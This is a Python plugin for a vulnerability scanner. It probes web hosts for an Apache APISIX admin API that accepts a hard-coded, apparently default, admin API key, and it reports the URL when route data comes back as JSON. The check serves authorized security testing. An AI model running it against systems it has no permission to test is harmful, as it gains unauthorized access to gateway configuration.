#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    APISIXFile
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

        self.dir_list = [
            "",
            "gateway/",
            "api/"
        ]
        self.file_list = [
            "apisix/admin/routes"
        ]

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    if path[-1] == '/':
                        headers = {'X-API-KEY': "edd1c9f034335f136f87ad84b625c8f1"}
                        for dir_path in self.dir_list:
                            for file_path in self.file_list:
                                url = path + dir_path + file_path
                                try:
                                    async with session.get(url=url, headers=headers, allow_redirects=False) as res:
                                        if res and res.status == 200:
                                            if "application/json" in res.headers.get("Content-Type", "text/html"):
                                                text = await res.text()
                                                # if text and '"node"' in text and '"plugins"' in text and '"uri"' in text:
                                                if text and '"node"' in text:
                                                    yield url
                                except:
                                    pass
